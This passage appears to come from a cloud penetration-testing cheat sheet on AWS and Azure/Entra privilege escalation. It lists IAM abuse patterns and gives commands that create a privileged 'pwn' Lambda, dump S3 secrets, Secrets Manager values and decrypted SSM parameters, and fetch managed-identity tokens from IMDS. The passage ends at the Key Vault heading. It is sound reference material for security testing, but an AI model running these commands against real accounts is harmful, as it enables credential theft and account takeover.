+<h3 id="24-core-enumeration">2.4 Core Enumeration<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#24-core-enumeration" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">aws</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> sts</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> get-caller-identity</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">aws</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> iam</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> get-user</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">aws</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> iam</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> list-attached-user-policies</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --user-name</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> NAME</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">aws</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> iam</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> list-user-policies</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --user-name</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> NAME</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">aws</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> iam</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> list-groups-for-user</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --user-name</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> NAME</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">aws</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> iam</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> simulate-principal-policy</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --policy-source-arn</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> ARN</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --action-names</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> iam:CreateUser</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> sts:AssumeRole</span></span></code></pre></figure>
+<p>For roles:</p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">aws</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> iam</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> get-role</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --role-name</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> NAME</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">aws</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> iam</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> list-attached-role-policies</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --role-name</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> NAME</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">aws</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> iam</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> get-policy-version</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --policy-arn</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> ARN</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --version-id</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> v1</span></span></code></pre></figure>
+<h3 id="25-common-iam-privilege-escalation-patterns">2.5 Common IAM Privilege Escalation Patterns<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#25-common-iam-privilege-escalation-patterns" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Documented extensively by Rhino Security / others. Examples:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="table-container"><table><thead><tr><th>Permission</th><th>Abuse</th></tr></thead><tbody><tr><td><code>iam:CreatePolicyVersion</code></td><td>Set default policy to <code>*:*</code></td></tr><tr><td><code>iam:SetDefaultPolicyVersion</code></td><td>Roll back to permissive version</td></tr><tr><td><code>iam:PassRole</code> + <code>ec2:RunInstances</code></td><td>Launch instance with privileged role</td></tr><tr><td><code>iam:PassRole</code> + <code>lambda:CreateFunction</code> + invoke</td><td>Run code with privileged role</td></tr><tr><td><code>iam:CreateAccessKey</code></td><td>Create keys for privileged user</td></tr><tr><td><code>iam:CreateLoginProfile</code></td><td>Console password for user</td></tr><tr><td><code>iam:AttachUserPolicy</code> / <code>PutUserPolicy</code></td><td>Self-attach admin</td></tr><tr><td><code>iam:UpdateAssumeRolePolicy</code></td><td>Trust yourself on privileged role</td></tr><tr><td><code>sts:AssumeRole</code> broad trust</td><td>Hop into higher roles</td></tr><tr><td><code>iam:PassRole</code> + <code>glue:</code> / <code>sagemaker:</code> / <code>cloudformation:</code></td><td>Many pass-role sinks</td></tr></tbody></table></div>
+<p><strong>PassRole + Lambda sketch:</strong></p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">aws</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> lambda</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> create-function</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --function-name</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> pwn</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="string"> \</span></span>
+<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value">  --runtime</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> python3.11</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="string"> \</span></span>
+<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value">  --role</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> arn:aws:iam::ACCOUNT:role/PrivilegedRole</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="string"> \</span></span>
+<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value">  --handler</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> lambda_function.lambda_handler</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="string"> \</span></span>
+<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value">  --zip-file</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> fileb://func.zip</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">aws</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> lambda</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> invoke</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --function-name</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> pwn</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> out.txt</span></span></code></pre></figure>
+<h3 id="26-s3">2.6 S3<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#26-s3" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">aws</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> s3</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> ls</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">aws</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> s3</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> ls</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> s3://bucket</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --recursive</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">aws</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> s3</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> cp</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> s3://bucket/secrets/</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> .</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --recursive</span></span></code></pre></figure>
+<p>Risks: public buckets, confused deputy, writable buckets hosting backdoored static sites/artifacts, backup buckets with AMIs/snapshots.</p>
+<h3 id="27-lambda">2.7 Lambda<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#27-lambda" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">aws</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> lambda</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> list-functions</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">aws</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> lambda</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> get-function</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --function-name</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> NAME</span></span>
+<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># Pull code, env vars with secrets</span></span></code></pre></figure>
+<p>Abuse: update function code if <code>lambda:UpdateFunctionCode</code>; event source injections; layer poisoning.</p>
+<h3 id="28-secrets-manager--ssm-parameter-store">2.8 Secrets Manager / SSM Parameter Store<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#28-secrets-manager--ssm-parameter-store" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">aws</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> secretsmanager</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> list-secrets</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">aws</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> secretsmanager</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> get-secret-value</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --secret-id</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> NAME</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">aws</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> ssm</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> get-parameters-by-path</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --path</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> /</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --recursive</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --with-decryption</span></span></code></pre></figure>
+<h3 id="29-ebs--snapshots--ami">2.9 EBS / Snapshots / AMI<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#29-ebs--snapshots--ami" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Create snapshot of victim volume → share to attacker account → mount → read credentials (classic). Needs <code>ec2:CreateSnapshot</code> style rights.</p>
+<h3 id="210-organizations--lateral">2.10 Organizations &amp; Lateral<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#210-organizations--lateral" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Compromise of payer / org admin → member accounts. SCPs may still restrict.</p>
+<h3 id="211-tools">2.11 Tools<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#211-tools" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ul>
+<li><strong>Pacu</strong> — AWS exploitation framework</li>
+<li><strong>CloudFox</strong> — situational awareness</li>
+<li><strong>Principal Mapper / Cloudsplaining / PMapper</strong> — policy graphing</li>
+<li><strong>enumerate-iam</strong> — permission brute discovery</li>
+</ul>
+<hr/>
+<h2 id="3-azure--entra-id-privilege-escalation">3. Azure / Entra ID Privilege Escalation<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#3-azure--entra-id-privilege-escalation" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<h3 id="31-identity-plane-vs-azure-rm">3.1 Identity Plane vs Azure RM<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#31-identity-plane-vs-azure-rm" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="table-container"><table><thead><tr><th>Plane</th><th>Examples</th></tr></thead><tbody><tr><td><strong>Entra ID (Azure AD)</strong></td><td>Users, app registrations, roles, groups, Conditional Access</td></tr><tr><td><strong>Azure Resource Manager</strong></td><td>Subscriptions, RGs, VMs, Key Vault data plane</td></tr></tbody></table></div>
+<p>Privesc often jumps between both.</p>
+<h3 id="32-service-principals--app-registrings">3.2 Service Principals &amp; App Registrings<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#32-service-principals--app-registrings" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Applications + service principals with client secrets/certificates. Leaked secrets in code/CI are gold.</p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">az</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> login</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --service-principal</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> APP_ID</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> SECRET</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --tenant</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> TENANT</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">az</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> ad</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> sp</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> show</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --id</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> APP_ID</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">az</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> role</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> assignment</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> list</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --assignee</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> APP_ID</span></span></code></pre></figure>
+<h3 id="33-managed-identities">3.3 Managed Identities<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#33-managed-identities" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>System/user-assigned identities on VMs, Functions, App Services.</p>
+<p>From Azure VM:</p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># IMDS</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -H</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> &quot;Metadata:true&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="string"> \</span></span>
+<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">  &quot;http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/&quot;</span></span></code></pre></figure>
+<p>Use token against ARM or other resources (<code>resource=</code> changes audience — Key Vault, Graph, storage).</p>
+<h3 id="34-high-value-entra-roles">3.4 High-Value Entra Roles<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#34-high-value-entra-roles" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="table-container"><table><thead><tr><th>Role</th><th>Impact</th></tr></thead><tbody><tr><td>Global Administrator</td><td>Full tenant (with CA caveats)</td></tr><tr><td>Privileged Role Administrator</td><td>Grant privileged roles</td></tr><tr><td>Application Administrator</td><td>Creds on apps → often escalate</td></tr><tr><td>Cloud Application Admin</td><td>Similar app abuse</td></tr><tr><td>Hybrid Identity Admin</td><td>On-prem sync paths</td></tr><tr><td>User Administrator</td><td>Reset some passwords</td></tr><tr><td>Helpdesk Administrator</td><td>Limited resets</td></tr></tbody></table></div>
+<h3 id="35-app-permission-abuse">3.5 App Permission Abuse<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#35-app-permission-abuse" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Application permissions (app-only) like <code>Directory.ReadWrite.All</code>, <code>AppRoleAssignment.ReadWrite.All</code>, <code>RoleManagement.ReadWrite.Directory</code> enable graph-based escalation.</p>
+<p>Flow:</p>
+<ol>
+<li>Find SP with dangerous Graph roles</li>
+<li>Add credentials if you can manage the app</li>
+<li>Login as SP → escalate</li>
+</ol>
+<h3 id="36-azure-rbac">3.6 Azure RBAC<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#36-azure-rbac" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">az</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> role</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> assignment</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> list</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --all</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -o</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> table</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">az</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> role</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> definition</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> list</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --name</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> &quot;Owner&quot;</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">az</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> role</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> definition</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> list</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --name</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> &quot;Contributor&quot;</span></span></code></pre></figure>
+<p><strong>Contributor</strong> on subscription ≠ Entra Global Admin, but can often read many secrets, run commands on VMs (run command), and abuse data planes.</p>
+<p><strong>Owner</strong> includes role assignment → self-escalate within scope.</p>
+<h3 id="37-key-vault">3.7 Key Vault<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#37-key-vault" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
